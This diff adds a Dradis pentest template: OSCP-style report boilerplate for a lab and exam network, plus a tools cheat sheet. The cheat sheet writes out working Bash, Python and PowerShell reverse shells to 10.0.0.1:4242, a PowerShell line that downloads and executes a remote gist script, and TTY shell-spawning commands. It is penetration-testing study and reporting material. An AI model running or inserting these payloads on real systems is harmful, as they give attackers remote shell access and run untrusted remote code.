@@ -1,0 +1,232 @@
+<?xml version="1.0" encoding="UTF-8"?><dradis-template version="3"><nodes><node><id>3</id><label>Uploaded files</label><parent-id/><position>0</position><properties><![CDATA[{
+}]]></properties><type-id>0</type-id><notes></notes><evidence></evidence><activities></activities></node><node><id>4</id><label>Summary</label><parent-id/><position>0</position><properties><![CDATA[{
+}]]></properties><type-id>0</type-id><notes><note><id>1</id><author>admin@securityroots.com</author><category-id>1</category-id><text><![CDATA[#[Title]#
+High-Level Summary
+
+#[Type]#
+Summary
+
+#[Summary]#
+John Doe was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. John’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
+
+When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, John had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below:
+
+* Lab Trophy 1 – Got in through X
+* Lab Trophy 2 – Got in through X
+* Lab Trophy 3 – Got in through X
+* Exam Trophy 1 – Got in through X
+* Exam Trophy 2 – Got in through X
+
+#[Recommendations]#
+John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.]]></text><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032619</created_at></activity><activity><action>update</action><user_email>admin@securityroots.com</user_email><created_at>1472070355</created_at></activity></activities><comments></comments></note><note><id>2</id><author>admin@securityroots.com</author><category-id>1</category-id><text><![CDATA[#[Title]#
+Methodologies
+
+#[Type]#
+Methodologies
+
+#[Summary]#
+John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.]]></text><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032649</created_at></activity><activity><action>update</action><user_email>admin@securityroots.com</user_email><created_at>1472070370</created_at></activity></activities><comments></comments></note><note><id>3</id><author>admin@securityroots.com</author><category-id>1</category-id><text><![CDATA[#[Title]#
+Information Gathering
+
+#[Type]#
+InformationGathering
+
+#[Summary]#
+The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, John was tasked with exploiting the lab and exam network. The specific IP addresses were:
+
+*Lab Network*
+
+* 192.168.1.1
+* 192.168.1.2
+* 192.168.1.3
+
+*Exam Network*
+
+* 172.16.203.133
+* 172.16.203.134
+* 172.16.203.135
+* 172.16.203.136
+]]></text><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032691</created_at></activity><activity><action>update</action><user_email>admin@securityroots.com</user_email><created_at>1472070363</created_at></activity></activities><comments></comments></note><note><id>4</id><author>admin@securityroots.com</author><category-id>1</category-id><text><![CDATA[#[Title]#
+Service Enumeration
+
+#[Type]#
+ServiceEnumeration
+
+#[Summary]#
+The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed.
+
+|_. Server IP Address |_. Ports Open |
+| 192.168.1.1 | TCP: 21,22,25,80,443 |
+| 192.168.1.2 | TCP: 22,55,90,8080,80 |
+| 192.168.1.3 | TCP: 1433,3389 |
+| 192.168.1.3 | UDP: 1434,161 |
+
+]]></text><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032709</created_at></activity><activity><action>update</action><user_email>admin@securityroots.com</user_email><created_at>1472070374</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1582897511</created_at></activity></activities><comments></comments></note><note><id>5</id><author>admin@securityroots.com</author><category-id>1</category-id><text><![CDATA[#[Title]#
+Maintaining Access
+
+#[Type]#
+MaintainingAccess
+
+#[Summary]#
+Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit. 
+
+John added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.]]></text><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032733</created_at></activity><activity><action>update</action><user_email>admin@securityroots.com</user_email><created_at>1472070367</created_at></activity></activities><comments></comments></note><note><id>6</id><author>admin@securityroots.com</author><category-id>1</category-id><text><![CDATA[#[Title]#
+House Cleaning
+
+#[Type]#
+HouseCleaning
+
+#[Summary]#
+The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
+
+After the trophies on both the lab network and exam network were completed, John removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.]]></text><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032754</created_at></activity><activity><action>update</action><user_email>admin@securityroots.com</user_email><created_at>1472070359</created_at></activity></activities><comments></comments></note><note><id>7</id><author>admin@securityroots.com</author><category-id>1</category-id><text><![CDATA[#[Title]#
+Additional Items
+
+#[Type]#
+Appendix
+
+#[Summary]#
+This section is placed for any additional items that were not mentioned in the overall report.]]></text><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032784</created_at></activity><activity><action>update</action><user_email>admin@securityroots.com</user_email><created_at>1472070349</created_at></activity></activities><comments></comments></note></notes><evidence></evidence><activities><activity><action>create</action><user_email>admin@securityroots.com</user_email><created_at>1472032595</created_at></activity></activities></node><node><id>20</id><label>Pentest Tools</label><parent-id/><position>0</position><properties><![CDATA[{
+}]]></properties><type-id>0</type-id><notes><note><id>25</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+TTY Shells
+
+#[Type]#
+Shells
+
+#[Description]#
+List of different ways to spawn a TTY Shell
+
+#[Summary]#
+bc. python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+bc. echo os.system('/bin/bash')
+
+bc. /bin/sh -i
+
+bc. /bin/sh -i
+
+bc. perl: exec "/bin/sh";
+
+bc. ruby: exec "/bin/sh"
+
+bc. lua: os.execute('/bin/sh')
+
+bc.. // From within IRB
+exec "/bin/sh"
+
+bc.. //From within VI
+:!bash
+:set shell=/bin/bash:shell
+
+bc.. //From within nmap
+!sh]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583761896</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583761903</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583762003</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764651</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764719</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583765385</created_at></activity></activities><comments></comments></note><note><id>26</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+Bash
+
+#[Type]#
+Reverse Shells
+
+#[Description]#
+Simple Bash Reverse Shell
+
+#[Summary]#
+bc.. bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583762124</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583765027</created_at></activity></activities><comments></comments></note><note><id>27</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+Python
+
+#[Type]#
+Reverse Shells
+
+#[Description]#
+Simple Python Reverse Shell
+
+#[Summary]#
+bc. export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")']]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583762177</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583765057</created_at></activity></activities><comments></comments></note><note><id>28</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+Powershell
+
+#[Type]#
+Reverse Shells
+
+#[Description]#
+Simple Powershell Reverse Shells
+
+#[Summary]#
+bc.. powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+bc.. powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+bc.. powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583762245</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583765045</created_at></activity></activities><comments></comments></note><note><id>29</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+PayloadsAllTheThings
+
+#[Type]#
+Resource
+
+#[Description]#
+A list of useful payloads and bypass for Web Application Security and Pentest/CTF
+
+#[Summary]#
+"PayloadsAllTheThings":https://github.com/swisskyrepo/PayloadsAllTheThings]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583762317</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764998</created_at></activity></activities><comments></comments></note><note><id>30</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+GTFOBins
+
+#[Type]#
+Resource
+
+#[Description]#
+Curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions
+
+#[Summary]#
+"GTFOBins":https://gtfobins.github.io/]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583762362</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764870</created_at></activity></activities><comments></comments></note><note><id>31</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+LOLBAS
+
+#[Type]#
+Resource
+
+#[Description]#
+Curated list of Windows binaries that can be exploited by an attacker to bypass local security restrictions
+
+#[Summary]#
+"LOLBAS":https://lolbas-project.github.io
+]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583763520</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583763532</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764973</created_at></activity></activities><comments></comments></note><note><id>32</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+Hashcat
+
+#[Type]#
+Password Cracking
+
+#[Description]#
+Used for determining hash modes for Hashcat
+
+#[Summary]#
+"Hashcat Hashes":https://hashcat.net/wiki/doku.php?id=example_hashes]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583764250</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764567</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764627</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764825</created_at></activity></activities><comments></comments></note><note><id>33</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+HackTricks
+
+#[Type]#
+Resource
+
+#[Description]#
+Tips and Tricks used during pentesting and CTFs
+
+#[Summary]#
+"Hack Tricks":https://book.hacktricks.xyz/]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583764682</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583764939</created_at></activity></activities><comments></comments></note><note><id>34</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+Digital River
+
+#[Type]#
+Resource
+
+#[Description]#
+Useful for testing exploits on Out-Of-The-Box Unpatched Windows images
+
+#[Summary]#
+"Digital River":https://archive.org/download/digital_river]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583764773</created_at></activity></activities><comments></comments></note></notes><evidence></evidence><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583243149</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583761633</created_at></activity></activities></node><node><id>24</id><label>Hosts</label><parent-id/><position>0</position><properties><![CDATA[{
+}]]></properties><type-id>0</type-id><notes></notes><evidence></evidence><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583765840</created_at></activity></activities></node><node><id>25</id><label>10.10.10.100: New Host</label><parent-id>24</parent-id><position>0</position><properties><![CDATA[{
+}]]></properties><type-id>0</type-id><notes><note><id>45</id><author>logic</author><category-id>2</category-id><text><![CDATA[#[Title]#
+My First Note
+
+#[Type]#
+Note
+
+#[Summary]#
+This is my First Note!
+]]></text><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583765908</created_at></activity></activities><comments></comments></note></notes><evidence></evidence><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583765865</created_at></activity></activities></node></nodes><issues></issues><methodologies><board version="3"><id>1</id><name>Payloads</name><node_id/><list><id>1</id><name>Linux</name><previous_id/><card><id>1</id><name>Python Shell Upgrade</name><description><![CDATA[bc.. python3 -c 'import pty; pty.spawn("/bin/bash")'
+export SHELL=bash
+export TERM=xterm256-color
+stty rows 38 columns 116]]></description><due_date>2020-03-02</due_date><previous_id/><assignees><assignee>logic</assignee></assignees><activities><activity><action>create</action><user_email>logic</user_email><created_at>1583170335</created_at></activity><activity><action>update</action><user_email>logic</user_email><created_at>1583170379</created_at></activity></activities><comments></comments></card></list><list><id>2</id><name>Windows</name><previous_id>1</previous_id></list></board></methodologies><categories><category><id>1</id><name>Report category</name></category><category><id>2</id><name>Default category</name></category></categories><tags><tag><id>1</id><name>!9467bd_critical</name><taggings></taggings></tag><tag><id>2</id><name>!d62728_high</name><taggings></taggings></tag><tag><id>3</id><name>!ff7f0e_medium</name><taggings></taggings></tag><tag><id>4</id><name>!6baed6_low</name><taggings></taggings></tag><tag><id>5</id><name>!2ca02c_info</name><taggings></taggings></tag></tags></dradis-template>
